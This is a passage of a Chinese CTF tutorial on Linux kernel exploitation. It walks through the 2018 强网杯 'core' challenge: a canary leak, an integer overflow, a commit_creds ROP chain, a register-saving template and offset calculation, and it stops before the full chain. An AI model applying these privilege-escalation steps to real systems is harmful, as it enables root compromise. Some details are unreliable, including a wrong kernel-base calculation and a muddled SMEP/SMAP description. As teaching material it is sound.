+</span></span></span><span class="line"><span class="cl"><span class="cp">#endif
+</span></span></span><span class="line"><span class="cl"><span class="cp"></span>	<span class="kt">kuid_t</span>		<span class="n">uid</span><span class="p">;</span>		<span class="cm">/* real UID of the task */</span>
+</span></span><span class="line"><span class="cl">	<span class="kt">kgid_t</span>		<span class="n">gid</span><span class="p">;</span>		<span class="cm">/* real GID of the task */</span>
+</span></span><span class="line"><span class="cl">	<span class="kt">kuid_t</span>		<span class="n">suid</span><span class="p">;</span>		<span class="cm">/* saved UID of the task */</span>
+</span></span><span class="line"><span class="cl">	<span class="kt">kgid_t</span>		<span class="n">sgid</span><span class="p">;</span>		<span class="cm">/* saved GID of the task */</span>
+</span></span><span class="line"><span class="cl">	<span class="kt">kuid_t</span>		<span class="n">euid</span><span class="p">;</span>		<span class="cm">/* effective UID of the task */</span>
+</span></span><span class="line"><span class="cl">	<span class="kt">kgid_t</span>		<span class="n">egid</span><span class="p">;</span>		<span class="cm">/* effective GID of the task */</span>
+</span></span><span class="line"><span class="cl">	<span class="kt">kuid_t</span>		<span class="n">fsuid</span><span class="p">;</span>		<span class="cm">/* UID for VFS ops */</span>
+</span></span><span class="line"><span class="cl">	<span class="kt">kgid_t</span>		<span class="n">fsgid</span><span class="p">;</span>		<span class="cm">/* GID for VFS ops */</span>
+</span></span><span class="line"><span class="cl">	<span class="kt">unsigned</span>	<span class="n">securebits</span><span class="p">;</span>	<span class="cm">/* SUID-less security management */</span>
+</span></span><span class="line"><span class="cl">	<span class="kt">kernel_cap_t</span>	<span class="n">cap_inheritable</span><span class="p">;</span> <span class="cm">/* caps our children can inherit */</span>
+</span></span><span class="line"><span class="cl">	<span class="kt">kernel_cap_t</span>	<span class="n">cap_permitted</span><span class="p">;</span>	<span class="cm">/* caps we&#39;re permitted */</span>
+</span></span><span class="line"><span class="cl">	<span class="kt">kernel_cap_t</span>	<span class="n">cap_effective</span><span class="p">;</span>	<span class="cm">/* caps we can actually use */</span>
+</span></span><span class="line"><span class="cl">	<span class="kt">kernel_cap_t</span>	<span class="n">cap_bset</span><span class="p">;</span>	<span class="cm">/* capability bounding set */</span>
+</span></span><span class="line"><span class="cl">	<span class="kt">kernel_cap_t</span>	<span class="n">cap_ambient</span><span class="p">;</span>	<span class="cm">/* Ambient capability set */</span>
+</span></span></code></pre></div><p>既然<code>uid</code>和<code>fsgid</code>为 0 就可以拿到<code>root</code>权限，那我们可以通过以下方式提权：</p>
+<ul>
+<li>修改结构体的对应的 id 为 0</li>
+<li>修改<code>task_struct</code>结构体中的<code>cred</code>指针指向一个满足要求的<code>cred</code></li>
+</ul>
+<p>我们要做的就是<code>定位cred结构体，修改id</code>/<code>修改cred指针</code></p>
+<h3 id="dos">Dos<a hidden class="anchor" aria-hidden="true" href="#dos">#</a></h3>
+<p>对内核进行 DoS 攻击比较容易，我们可以通过以下几种方式来实现。</p>
+<ul>
+<li>触发内核中的某个漏洞让内核崩溃</li>
+<li>触发内核中的死锁</li>
+<li>触发大量的内核内存泄漏，即存在大量的内存被申请但是没有被释放</li>
+</ul>
+<h2 id="kernel-保护机制">Kernel 保护机制<a hidden class="anchor" aria-hidden="true" href="#kernel-保护机制">#</a></h2>
+<h3 id="smep">SMEP<a hidden class="anchor" aria-hidden="true" href="#smep">#</a></h3>
+<p>内核不可执行用户空间，防止内核执行用户态 shellcode。</p>
+<p>SMEP—-&gt;管理模式执行保护，禁止内核访问用户空间的数据，SMAP—-&gt;管理模式访问保护，类似于NX，即内核态无法执行shellcode。</p>
+<h3 id="smap">SMAP<a hidden class="anchor" aria-hidden="true" href="#smap">#</a></h3>
+<p>内核不可访问用户空间数据，防止内核任意读写用户空间。</p>
+<h3 id="kaslr">KASLR<a hidden class="anchor" aria-hidden="true" href="#kaslr">#</a></h3>
+<p>内核地址随机化，相当于 ASLR（非默认启用，需在内核命令行中加入 kaslr 开启），随机化内核映像和模块加载位置。</p>
+<h3 id="stack-protector">Stack Protector<a hidden class="anchor" aria-hidden="true" href="#stack-protector">#</a></h3>
+<p>canary，在编译内核时设置<code>CONFIG_CC_STACKPROTECTOR</code>选项，即可开启该保护，一般而言开了这个保护再编译驱动会发现有 canary。</p>
+<h3 id="kpti">KPTI<a hidden class="anchor" aria-hidden="true" href="#kpti">#</a></h3>
+<p>KPTI 即内核页表隔离（Kernel page-table isolation），内核空间与用户空间分别使用两组不同的页表集，这对于内核的内存管理产生了根本性的变化。</p>
+<h2 id="ctf-例题">CTF 例题<a hidden class="anchor" aria-hidden="true" href="#ctf-例题">#</a></h2>
+<blockquote>
+<p>2018强网杯 core</p>
+</blockquote>
+<p>接下来以一道例题来了解 Kernel Pwn 的解题流程。</p>
+<h3 id="题目信息">题目信息<a hidden class="anchor" aria-hidden="true" href="#题目信息">#</a></h3>
+<p>题目给出了以下四个文件：</p>
+<ul>
+<li><code>bzImage</code>：内核压缩镜像。</li>
+<li><code>core.cpio</code>：文件系统。</li>
+<li><code>start.sh</code>：通过 qemu 模拟启动内核的 shell 脚本。</li>
+<li><code>core.ko</code>：存在漏洞的模块。</li>
+</ul>
+<p>我们需要通过分析<code>core.ko</code>中的漏洞来编写相应的 exp 进行利用，和用户态的 pwn 不同的是内核的 exp 一般通过 C 语言编写，程序通过模块定义的函数来与内核交互，利用方式就是将 C 编译好的 exp 丢到模拟内核的虚拟机上运行。</p>
+<h3 id="分析题目">分析题目<a hidden class="anchor" aria-hidden="true" href="#分析题目">#</a></h3>
+<p>查看<code>start.sh</code>启动脚本，发现内核开启了 KASLR 保护。直接运行脚本启动失败，将内存修改大一些后启动成功。</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">qemu-system-x86_64 <span class="se">\ </span> 
+</span></span><span class="line"><span class="cl">-m 256M <span class="se">\ </span> 
+</span></span><span class="line"><span class="cl">-kernel ./bzImage <span class="se">\ </span> 
+</span></span><span class="line"><span class="cl">-initrd ./core.cpio <span class="se">\ </span> 
+</span></span><span class="line"><span class="cl">-append <span class="s2">&#34;root=/dev/ram rw console=ttyS0 oops=panic panic=1 quiet kaslr&#34;</span> <span class="se">\ </span> 
+</span></span><span class="line"><span class="cl">-s <span class="se">\ </span> 
+</span></span><span class="line"><span class="cl">-netdev user,id<span class="o">=</span>t0, -device e1000,netdev<span class="o">=</span>t0,id<span class="o">=</span>nic0 <span class="se">\ </span> 
+</span></span><span class="line"><span class="cl">-nographic <span class="se">\
+</span></span></span></code></pre></div><p>启动之后发现过段时间会关机。解包，</p>
+<p>先解包<code>core.cpio</code>，<code>file</code>查看发现<code>core.cpio</code>文件是经过 gzip 压缩过的，先解压然后再解包。</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">mkdir unpacked
+</span></span><span class="line"><span class="cl">mv core.cpio ./unpacked/core.cpio.gz
+</span></span><span class="line"><span class="cl"><span class="nb">cd</span> unpacked
+</span></span><span class="line"><span class="cl">gunzip core.cpio.gz <span class="c1">#解压得到cpio文件</span>
+</span></span><span class="line"><span class="cl">cpio -idvm &lt; ./core.cpio
+</span></span></code></pre></div><p>分析<code>init</code>脚本发现原来是其中写了一行定时关机的命令，直接注释掉即可。</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl"><span class="cp">#!/bin/sh
+</span></span></span><span class="line"><span class="cl"><span class="cp"></span>mount -t proc proc /proc
+</span></span><span class="line"><span class="cl">mount -t sysfs sysfs /sys
+</span></span><span class="line"><span class="cl">mount -t devtmpfs none /dev
+</span></span><span class="line"><span class="cl">/sbin/mdev -s
+</span></span><span class="line"><span class="cl">mkdir -p /dev/pts
+</span></span><span class="line"><span class="cl">mount -vt devpts -o <span class="nv">gid</span><span class="o">=</span>4,mode<span class="o">=</span><span class="m">620</span> none /dev/pts
+</span></span><span class="line"><span class="cl">chmod <span class="m">666</span> /dev/ptmx
+</span></span><span class="line"><span class="cl">cat /proc/kallsyms &gt; /tmp/kallsyms
+</span></span><span class="line"><span class="cl"><span class="nb">echo</span> <span class="m">1</span> &gt; /proc/sys/kernel/kptr_restrict
+</span></span><span class="line"><span class="cl"><span class="nb">echo</span> <span class="m">1</span> &gt; /proc/sys/kernel/dmesg_restrict
+</span></span><span class="line"><span class="cl">ifconfig eth0 up
+</span></span><span class="line"><span class="cl">udhcpc -i eth0
+</span></span><span class="line"><span class="cl">ifconfig eth0 10.0.2.15 netmask 255.255.255.0
+</span></span><span class="line"><span class="cl">route add default gw 10.0.2.2 
+</span></span><span class="line"><span class="cl">insmod /core.ko
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1">#poweroff -d 120 -f &amp;</span>
+</span></span><span class="line"><span class="cl">setsid /bin/cttyhack setuidgid <span class="m">1000</span> /bin/sh
+</span></span><span class="line"><span class="cl"><span class="nb">echo</span> <span class="s1">&#39;sh end!\n&#39;</span>
+</span></span><span class="line"><span class="cl">umount /proc
+</span></span><span class="line"><span class="cl">umount /sys
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">poweroff -d <span class="m">0</span>  -f
+</span></span></code></pre></div><p>分析提供的 LKM。</p>
+<ul>
+<li>查保护：</li>
+</ul>
+<p>存在 canary 保护。</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">❯ checksec core.ko
+</span></span><span class="line"><span class="cl">    Arch:       amd64-64-little
+</span></span><span class="line"><span class="cl">    RELRO:      No RELRO
+</span></span><span class="line"><span class="cl">    Stack:      Canary found
+</span></span><span class="line"><span class="cl">    NX:         NX enabled
+</span></span><span class="line"><span class="cl">    PIE:        No PIE <span class="o">(</span>0x0<span class="o">)</span>
+</span></span><span class="line"><span class="cl">    Stripped:   No
+</span></span></code></pre></div><p>分析<code>init_module</code>函数，函数中创建了一个进程节点文件<code>/proc/core</code>，这也是后续我们与内核模块间通信的媒介。</p>
+<p><img decoding="async" loading="lazy" src="assets/Pasted%20image%2020250729232856.png" style="max-width: 100%; height: auto;"></p>
+<p>分析结构化<code>core_fops</code>发现，定义了三个回调函数：</p>
+<ul>
+<li><code>core_write</code></li>
+<li><code>core_ioctl</code></li>
+<li><code>core_release</code></li>
+</ul>
+<p>在<code>core_ioctl</code>中，对传入值进行判断并有三个分支，分别是<code>core_read()</code>，设置全局变量和<code>core_copy_func</code>。</p>
+<p>因为有 canary 首先要泄露栈上信息，在<code>core_read</code>中，<code>copy_to_user</code>可以将内核空间拷贝一块数据到用户空间，而这里的 off 可以在<code>core_ioctl</code>任意设置，所以在这里能泄露栈上内容，也就能泄露 canary。</p>
+<img src="/assets/Pasted%20image%2020250729141951.png" style="zoom: 67%;" />
+<p>然后是在<code>core_copy_func</code>中，传入变量存在整数溢出，可以利用<code>qmemcpy</code>将全局变量<code>name</code>的值写入内核栈上。</p>
+<img src="/assets/Pasted%20image%2020250729143310.png" style="zoom: 67%;" />
+<p>在<code>core_write</code>中可以向全局变量<code>name</code>中写入数据，最后通过<code>core_copy_func</code>写入到内核栈上，那么这里需要放一个提权的<code>rop_chain</code>，因为在<code>tmp</code>目录先可以直接查看<code>commit_creds</code>和<code>prepare_kernel_cred</code>的地址，所以可以直接构造 rop 用<code>commit_creds(prepare_kernel_cred(0))</code>提权。</p>
+<img src="/assets/Pasted%20image%2020250729142630.png" style="zoom:67%;" />
+<h3 id="gdb调试">gdb调试<a hidden class="anchor" aria-hidden="true" href="#gdb调试">#</a></h3>
+<p>我们通过 gdb 调试内核需要在启动脚本中添加几个参数：</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl"><span class="cp">#!/bin/sh
+</span></span></span><span class="line"><span class="cl"><span class="cp"></span>qemu-system-x86_64 <span class="se">\
+</span></span></span><span class="line"><span class="cl"><span class="se"></span>  -m 256M <span class="se">\
+</span></span></span><span class="line"><span class="cl"><span class="se"></span>  -cpu qemu64,+smep,+smap -smp <span class="m">2</span> <span class="se">\
+</span></span></span><span class="line"><span class="cl"><span class="se"></span>  -kernel ./arch/x86/boot/bzImage <span class="se">\
+</span></span></span><span class="line"><span class="cl"><span class="se"></span>  -append <span class="s2">&#34;console=ttyS0 quiet panic=-1 nokaslr&#34;</span> <span class="se">\
+</span></span></span><span class="line"><span class="cl"><span class="se"></span>  -initrd ./rootfs.cpio <span class="se">\
+</span></span></span><span class="line"><span class="cl"><span class="se"></span>  -drive <span class="nv">file</span><span class="o">=</span>flag,if<span class="o">=</span>virtio,format<span class="o">=</span>raw,readonly<span class="o">=</span>on <span class="se">\
+</span></span></span><span class="line"><span class="cl"><span class="se"></span>  -nographic <span class="se">\
+</span></span></span><span class="line"><span class="cl"><span class="se"></span>  -no-reboot <span class="se">\
+</span></span></span><span class="line"><span class="cl"><span class="se"></span>  -monitor /dev/null <span class="se">\
+</span></span></span><span class="line"><span class="cl"><span class="se"></span>  -s -S
+</span></span></code></pre></div><p>参数：<code>-s -S</code>等价于<code>-gdb tcp::1234</code>，监听 1234 端口。</p>
+<p>gdb 调试步骤：</p>
+<p><code>vmlinux</code>是 Linux 内核的未压缩 ELF 可执行文件，我们使用 gdb 调试内核主要就是调试这个文件。</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">gdb vmlinux            
+</span></span><span class="line"><span class="cl"><span class="o">(</span>gdb<span class="o">)</span> target remote :1234                        <span class="c1">#attach 到目标端口</span>
+</span></span><span class="line"><span class="cl"><span class="o">(</span>gdb<span class="o">)</span> <span class="nb">set</span> architecture aarch64                   <span class="c1">#如果是异架构，则设置对应架构</span>
+</span></span></code></pre></div><p>在有些题目中会直接给我们一个 bzImage 文件，这是不能用于调试的。但是我们可以通过[vmlinux-to-elf](<a href="https://github.com/marin-m/vmlinux-to-elf">marin-m/vmlinux-to-elf：用于恢复完全可分析的 .ELF 来自原始内核，通过提取内核符号表 （kallsyms）</a>)工具将其提取为带符号可调式的 vmlinux 文件：</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">./vmlinux-to-elf ./bzImage &gt; ./vmlinux
+</span></span></code></pre></div><p>常用命令：</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl"><span class="o">(</span>gdb<span class="o">)</span> b func_name     <span class="c1">#普通断点</span>
+</span></span><span class="line"><span class="cl"><span class="o">(</span>gdb<span class="o">)</span> hb func_name    <span class="c1">#硬件断点</span>
+</span></span><span class="line"><span class="cl"><span class="o">(</span>gdb<span class="o">)</span> b start_kernel  <span class="c1">#Linux 内核启动的核心函数</span>
+</span></span><span class="line"><span class="cl"><span class="o">(</span>gdb<span class="o">)</span> info registers  <span class="c1">#查看寄存器</span>
+</span></span><span class="line"><span class="cl"><span class="o">(</span>gdb<span class="o">)</span> x/32gx &lt;addr&gt;
+</span></span><span class="line"><span class="cl"><span class="o">(</span>gdb<span class="o">)</span> info threads
+</span></span><span class="line"><span class="cl"><span class="o">(</span>gdb<span class="o">)</span> thread apply all bt full <span class="c1">#对当前进程中的每个线程都执行 bt full</span>
+</span></span></code></pre></div><p>在 gdb 窗口种加载 ko 文件：</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl"><span class="o">(</span>gdb<span class="o">)</span> add-symbol-file &lt;ko文件位置&gt; &lt;text段地址&gt; -s .data &lt;data段地址&gt; -s .bss &lt;bss段地址&gt;
+</span></span><span class="line"><span class="cl"><span class="o">(</span>gdb<span class="o">)</span> add-symbol-file vuln.ko 0xffffffffc0000000 <span class="c1">#加载内核模块符号</span>
+</span></span></code></pre></div><p>调试模块：</p>
+<pre tabindex="0"><code>gdb vuln.ko
+(gdb) file vmlinux
+</code></pre><p>手动安装符号表：</p>
+<pre tabindex="0"><code>(gdb) add vuln.ko
+</code></pre><p>显示调试内核的 dmesg</p>
+<pre tabindex="0"><code>(gdb) lx-demsg
+(gdb) p $lx_current().pid
+(gdb) p $lx_current().comm
+</code></pre><p>读取内核信息：</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">cat /proc/modules     <span class="c1"># 可得内核模块加载基址</span>
+</span></span><span class="line"><span class="cl">cat /proc/version     <span class="c1"># 查看当前运行的内核版本</span>
+</span></span></code></pre></div><h3 id="解题流程">解题流程<a hidden class="anchor" aria-hidden="true" href="#解题流程">#</a></h3>
+<p>通常分析一道题目我们首先要分析给出的文件，有些题目会直接把漏洞模块放在文件系统中，这样我们要首先解包文件系统然后进行分析。</p>
+<p>在 CTF 题目中的 cpio 镜像很多都是 gzip 压缩过的，如果看到<code>cpio: premature end of file</code>报错，说明 cpio 镜像是经过 gzip 压缩的。针对这种 gzip 压缩过的文件我们需要先解压然后再解包。</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">gunzip rootfs.cpio.gz    <span class="c1">#解压</span>
+</span></span><span class="line"><span class="cl">cpio -idvm &lt; ./core.cpio <span class="c1">#解包</span>
+</span></span></code></pre></div><p>然后我们一般会分析<code>/etc/init.d/rcS</code>中或者<code>/init</code>中存放的内核启动后执行的命令。</p>
+<p>之后分析具体的漏洞模块，然后结合调试编写 exp。</p>
+<p>之后就是将编译好的 exp 添加到文件系统，然后进行模拟运行。</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">gcc ./exp.c -o exp -masm<span class="o">=</span>intel --static -g
+</span></span><span class="line"><span class="cl">chmod <span class="m">777</span> ./exp
+</span></span><span class="line"><span class="cl">find . <span class="p">|</span> cpio -o --format<span class="o">=</span>newc &gt; ./rootfs.cpio
+</span></span><span class="line"><span class="cl">chmod <span class="m">777</span> ./rootfs.cpio
+</span></span></code></pre></div><p>之后就是本地调试完成后打远程。</p>
+<p>通过分析启动脚本来检查内核存在什么保护：</p>
+<p>利用以下脚本分析即可发现存在 KASLR 保护。</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">qemu-system-x86_64 <span class="se">\
+</span></span></span><span class="line"><span class="cl"><span class="se"></span>-m 256M <span class="se">\
+</span></span></span><span class="line"><span class="cl"><span class="se"></span>-kernel ./bzImage <span class="se">\
+</span></span></span><span class="line"><span class="cl"><span class="se"></span>-initrd  ./core.cpio <span class="se">\
+</span></span></span><span class="line"><span class="cl"><span class="se"></span>-append <span class="s2">&#34;root=/dev/ram rw console=ttyS0 oops=panic panic=1 quiet kaslr&#34;</span> <span class="se">\
+</span></span></span><span class="line"><span class="cl"><span class="se"></span>-s  <span class="se">\
+</span></span></span><span class="line"><span class="cl"><span class="se"></span>-netdev user,id<span class="o">=</span>t0, -device e1000,netdev<span class="o">=</span>t0,id<span class="o">=</span>nic0 <span class="se">\
+</span></span></span><span class="line"><span class="cl"><span class="se"></span>-nographic  <span class="se">\
+</span></span></span></code></pre></div><p>提取 <code>vmlinux</code> 后用 <code>readelf -S</code> 或直接 <code>file</code> 检查。如果 FGKASLR <strong>未生效</strong>，sections 数通常 ~30+。若启用了 FGKASLR，<code>vmlinux</code> 会有很多（例如 30000+）section（每个函数都会有 section）。</p>
+<p>检查<code>CONFIG_SLAB_FREELIST_HARDEN</code>：</p>
+<ul>
+<li>若开启，freelist 中 free 对象里的指针会被用 <code>kmem_cache</code> 的随机值做 XOR 混淆。</li>
+<li>检查方法：在 <code>kmem_cache_alloc()</code>、<code>slab_alloc()</code> 或相关分配点下断点，确定 <code>kmem_cache</code> 的地址，然后通过 <code>kmem_cache.cpu_slab</code> 的偏移加上 $GS_BASE 得到 <code>kmem_cache_cpu</code>，由此可定位 <code>freelist</code> 指向的地址。再检查 slub 中 free 对象内的指针是否为有效地址。</li>
+</ul>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">gdb&gt; b kmem_cache_alloc
+</span></span><span class="line"><span class="cl">gdb&gt; b kmem_cache
+</span></span><span class="line"><span class="cl"><span class="c1"># 确定 kmem_cache 的地址</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># 通过 kmem_cache-&gt;cpu_slab 偏移 + $GS_BASE 得到 per-CPU slab (kmem_cache_cpu)。</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># 查看 freelist：</span>
+</span></span><span class="line"><span class="cl"><span class="c1">#   若开启了硬化，freelist 内存中存放的指针是 混淆值。</span>
+</span></span><span class="line"><span class="cl"><span class="c1">#   XOR kmem_cache-&gt;random 后才能得到有效的对象地址。</span>
+</span></span></code></pre></div><p>检查是否存在<code>userfaultfd</code>：</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">grep userfaultfd /proc/kallsyms
+</span></span></code></pre></div><h3 id="rop">ROP<a hidden class="anchor" aria-hidden="true" href="#rop">#</a></h3>
+<p>内核态的 ROP 和用户态的 ROP 一般无二，只不过利用的 gadget 变成了内核中的 gadget，所需要构造执行的 ROP 链由<code>system()</code>
+。变成了<code>commit_creds(prepare_kernel_cred(&amp;init_task))</code>或<code>commit_creds(&amp;init_cred)</code>。</p>
+<p>当成功执行如上函数之后，当前线程的<code>cred</code>结构体便变为<code>init</code>进程的<code>cred</code>的拷贝，我们也就获得了 root 权限，此时在用户态起一个 shell 便能获得 root shell</p>
+<p>需要注意的是旧版本内核上所用的提权方法<code>commit_creds(prepare_kernel_cred(NULL))</code>已经不再能被使用，在高版本（5.0以上）的内核当中<code>prepare_kernel_cred(NULL)</code>将不再返回一个 root cred，这也令 ROP 链的构造变为更加困难 。</p>
+<p>通常情况下，我们的 exp 需要进入到内核当中完成提权，而我们最终仍然需要返回用户态以获得一个root权限的shell，因此在我们的exp 进入内核态之前我们需要手动模拟用户态进入内核态的准备工作——保存各寄存器的值到内核栈上，以便于后续返回用户态。</p>
+<p>通常情况下使用如下函数保存各寄存器值到我们自己定义的变量中，以便于构造 rop 链：</p>
+<p>板子：</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="kt">size_t</span> <span class="n">user_cs</span><span class="p">,</span> <span class="n">user_ss</span><span class="p">,</span> <span class="n">user_rflags</span><span class="p">,</span> <span class="n">user_sp</span><span class="p">;</span>  
+</span></span><span class="line"><span class="cl"><span class="kt">void</span> <span class="nf">save_status</span><span class="p">()</span>  
+</span></span><span class="line"><span class="cl"><span class="p">{</span>  
+</span></span><span class="line"><span class="cl">	<span class="k">asm</span> <span class="k">volatile</span> <span class="p">(</span>  
+</span></span><span class="line"><span class="cl">		<span class="s">&#34;mov user_cs, cs;&#34;</span>  
+</span></span><span class="line"><span class="cl">		<span class="s">&#34;mov user_ss, ss;&#34;</span>  
+</span></span><span class="line"><span class="cl">		<span class="s">&#34;mov user_sp, rsp;&#34;</span>  
+</span></span><span class="line"><span class="cl">		<span class="s">&#34;pushf;&#34;</span>  
+</span></span><span class="line"><span class="cl">		<span class="s">&#34;pop user_rflags;&#34;</span>  <span class="p">);</span>  
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">	<span class="nf">puts</span><span class="p">(</span><span class="s">&#34;</span><span class="se">\033</span><span class="s">[34m</span><span class="se">\033</span><span class="s">[1m[*] Status has been saved.</span><span class="se">\033</span><span class="s">[0m&#34;</span><span class="p">);</span>  
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></div><ul>
+<li>编译指定参数<code>-masm=intel</code></li>
+</ul>
+<p>返回用户态：</p>
+<ul>
+<li><code>swapgs</code>指令恢复用户态 GS 寄存器</li>
+<li><code>sysretq</code>或<code>iretq</code>恢复到用户空间</li>
+</ul>
+<p>构造如下 ROP 链以返回用户态并获得一个 shell：</p>
+<pre tabindex="0"><code>↓ swapgs  
+iretq  
+user_shell_addr  
+user_cs  
+user_eflags //64bit user_rflags  
+user_sp  
+user_ss
+</code></pre><p>arttnba3 师傅将 kernel pwn 中常用的一些代码封装成了一个头文件，我们可以直接下载引用：</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">wget https://github.com/arttnba3/Linux-kernel-exploitation/blob/main/tools/kernelpwn.h
+</span></span><span class="line"><span class="cl">mv ./kernelpwn.h /usr/include/kernelpwn.h
+</span></span></code></pre></div><p>这样我们只需要在 exp 中引用即可。</p>
+<h3 id="计算偏移">计算偏移<a hidden class="anchor" aria-hidden="true" href="#计算偏移">#</a></h3>
+<p>在没有开启 kptr_restrict 的情况下，使用这一指令就可以查看对应符号在内核中的地址</p>
+<p>寻找 kernel 中内核程序的漏洞，之后调用该程序进入内核态，利用漏洞进行提权，提完权后，返回用户态。</p>
+<p>当你想知道某个内核符号的地址/偏移时，通常会查看 <code>/proc/kallsyms</code>。该伪文件会暴露内核符号的地址。</p>
+<ul>
+<li>要使用 <code>/proc/kallsyms</code>，内核配置项 <code>CONFIG_KALLSYMS</code> 必须被启用。默认情况下该文件只包含 <code>.text</code> 段的符号（<code>T</code> 表示全局函数，<code>t</code> 表示内部函数）。</li>
+</ul>
+<p>由于<code>commit_creds</code>和<code>prepare_kernel_cred</code>在 vmlinux 中的偏移固定，那么通过确定在 vmlinux 中的地址和固定的偏移，就可以确定 vmlinux 的基地址。</p>
+<p>首先在 qemu 中查看镜像加载的基地址，但需要 root 权限，首先在<code>init</code>中修改为：</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">setsid /bin/cttyhack setuidgit <span class="m">0</span> /bin/sh
+</span></span></code></pre></div><p>然后重打包，查看 core.ko 中<code>.text</code>的基地址。</p>
+<pre tabindex="0"><code>/ # cat /sys/module/core/sections/.text
+0xffffffffc0039000
+</code></pre><p>启动 gdb，然后添加core.ko的符号表，加载了符号表之后就可以直接对函数名下断点了。</p>
+<p>查看基地址：</p>
+<pre tabindex="0"><code>ffffffff92a00000 T startup_64
+</code></pre><p>然后确定偏移：</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">elf</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s2">&#34;./vmlinux&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="c1">#64位内核经典的高半区固定地址</span>
+</span></span><span class="line"><span class="cl"><span class="n">base</span> <span class="o">=</span> <span class="mh">0xffffffff81000000</span>
+</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="s2">&#34;commit_creds&#34;</span><span class="p">,</span> <span class="nb">hex</span><span class="p">(</span><span class="n">elf</span><span class="o">.</span><span class="n">symbols</span><span class="p">[</span><span class="s1">&#39;commit_creds&#39;</span><span class="p">]</span><span class="o">-</span><span class="mh">0xffffffff81000000</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="s2">&#34;prepare_kernel_cred&#34;</span><span class="p">,</span> <span class="nb">hex</span><span class="p">(</span><span class="n">elf</span><span class="o">.</span><span class="n">symbols</span><span class="p">[</span><span class="s1">&#39;prepare_kernel_cred&#39;</span><span class="p">]</span><span class="o">-</span><span class="mh">0xffffffff81000000</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl"><span class="s2">&#34;&#34;&#34;
+</span></span></span><span class="line"><span class="cl"><span class="s2">❯ checksec vmlinux
+</span></span></span><span class="line"><span class="cl"><span class="s2">    Arch:       amd64-64-little
+</span></span></span><span class="line"><span class="cl"><span class="s2">    Version:    4.15.8
+</span></span></span><span class="line"><span class="cl"><span class="s2">    RELRO:      No RELRO
+</span></span></span><span class="line"><span class="cl"><span class="s2">    Stack:      Canary found
+</span></span></span><span class="line"><span class="cl"><span class="s2">    NX:         NX unknown - GNU_STACK missing
+</span></span></span><span class="line"><span class="cl"><span class="s2">    PIE:        No PIE (0xffffffff81000000)
+</span></span></span><span class="line"><span class="cl"><span class="s2">    Stack:      Executable
+</span></span></span><span class="line"><span class="cl"><span class="s2">    RWX:        Has RWX segments
+</span></span></span><span class="line"><span class="cl"><span class="s2">    Stripped:   No
+</span></span></span><span class="line"><span class="cl"><span class="s2">&#34;&#34;&#34;</span>
+</span></span></code></pre></div><p>偏移：</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">commit_creds 0x7fc8d
+</span></span><span class="line"><span class="cl">prepare_kernel_cred 0x7ff85
+</span></span></code></pre></div><p>在 qemu 中查看符号地址：</p>
+<pre tabindex="0"><code>/ # cat /tmp/kallsyms | grep commit_creds
+ffffffff82e9c8e0 T commit_creds
+/ # cat /tmp/kallsyms | grep prepare_kernel_cred
+ffffffff82e9cce0 T prepare_kernel_cred
+</code></pre><p>计算内核基址：</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="n">base</span> <span class="o">=</span> <span class="n">commit_creds</span> <span class="o">-</span> <span class="mh">0x7fc8d</span> <span class="o">=</span> <span class="mh">0xffffffff9361cc53</span>
+</span></span></code></pre></div><p>构造 ROP 链：</p>
+<p>要用 rop 实现执行<code>commit_creds(prepare_kernel_cred(0))</code>提权和执行<code>swapgs; iretq</code>命令返回用户态。实现流程大致为：</p>
